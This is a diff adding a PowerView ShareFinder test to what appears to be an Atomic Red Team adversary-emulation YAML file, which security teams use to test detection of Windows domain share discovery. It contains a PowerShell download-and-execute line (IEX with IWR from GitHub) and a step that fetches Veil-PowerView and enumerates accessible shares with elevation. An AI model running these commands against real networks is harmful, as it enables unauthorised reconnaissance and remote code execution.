@@ -101,3 +101,38 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
     name: powershell
+- name: PowerView ShareFinder
+  auto_generated_guid: 
+  description: PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.
+  supported_platforms:
+  - windows
+  input_arguments:
+    function:
+      description: Powerview Function
+      type: String
+      default: Invoke-ShareFinder -CheckShareAccess
+    File1:
+      description: Powerview Zip Path
+      type: Path
+      default: $env:TEMP\Veil-PowerView.zip
+    File2:
+      description: Powerview Powershell module
+      type: Path
+      default: $env:TEMP\Veil-PowerView-master\PowerView\powerview.ps1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Checks if the powerview module exists
+    prereq_command: 'if (Test-Path  $(cmd /c echo #{File2})) {exit 0} else {exit 1}'
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/darkoperator/Veil-PowerView/archive/refs/heads/master.zip" -OutFile #{File1}
+      Expand-Archive #{File1} $env:TEMP\
+  executor:
+    command: |
+      Import-Module #{File2}
+      #{function}
+      Remove-Module #{File2} -Force -ErrorAction Ignore
+    cleanup_command: |
+      Remove-Item -Path $env:TEMP\Veil-PowerView-master -Recurse -Force -Confirm:$false -ErrorAction Ignore
+      Remove-Item #{File1} -Force -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
